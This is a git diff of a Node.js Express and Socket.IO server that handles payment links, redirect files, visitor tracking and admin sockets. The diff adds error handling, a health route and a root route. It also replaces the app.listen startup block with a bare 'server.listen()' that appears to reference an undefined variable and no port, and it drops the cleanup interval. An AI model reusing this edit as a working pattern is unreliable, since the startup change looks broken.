@@ -29,10 +29,10 @@ const expiredLinks = new Set();
 // Track admin sockets separately
 const adminSockets = new Set();
 
-// Create HTML redirect files
 function createRedirectFile(targetHtml) {
-  const fileName = `pay${SERVER_ID}.html`;
-  const redirectHtml = `
+  try {
+    const fileName = `pay${SERVER_ID}.html`;
+    const redirectHtml = `
 <!DOCTYPE html>
 <html>
 <head>
@@ -47,11 +47,15 @@ function createRedirectFile(targetHtml) {
 </html>
 `;
 
-  fs.writeFileSync(fileName, redirectHtml);
-  console.log(`Created redirect file: ${fileName} -> ${targetHtml}`);
-  return fileName;
+    fs.writeFileSync(fileName, redirectHtml);
+    console.log(`Created redirect file: ${fileName} -> ${targetHtml}`);
+    return fileName;
+  } catch (error) {
+    console.error(`Failed to create redirect file: ${error.message}`);
+    // Return a fallback file name - this will use index.html as fallback
+    return 'index.html';
+  }
 }
-
 // Create a redirect file for landing.html
 const PAYMENT_REDIRECT_FILE = createRedirectFile('landing.html');
 
@@ -379,6 +383,15 @@ function cleanupInactiveVisitors() {
   }
 }
 
+// Add a health check route at the top of your routes
+app.get('/health', (req, res) => {
+  res.send({
+    status: 'ok',
+    serverTime: new Date().toISOString(),
+    serverId: SERVER_ID
+  });
+});
+
 // Serve static files
 app.use(express.static(path.join(__dirname, '.')));
 
@@ -430,6 +443,10 @@ app.get('/api/getTransactionPid', (req, res) => {
   });
   
   res.json({ pid });
+});
+// Add this at the end of your routes, before starting the server
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 // Payment Links Endpoints
@@ -886,22 +903,14 @@ app.post('/api/clearTransactions', (req, res) => {
   }
 });
 
-// Start server
-const PORT = process.env.PORT || 3000;
-const server = app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log(`Redirect file: ${PAYMENT_REDIRECT_FILE}`);
-  
-  // Start the cleanup interval for inactive visitors
-  setInterval(cleanupInactiveVisitors, 10000); // Check every 10 seconds
-});
+server.listen()
 
-// Initialize Socket.IO
 const io = new Server(server, {
   cors: {
     origin: "*",
     methods: ["GET", "POST"]
-  }
+  },
+  transports: ['websocket', 'polling'] // Explicitly specify transports
 });
 
 // Helper function to broadcast to admin sockets
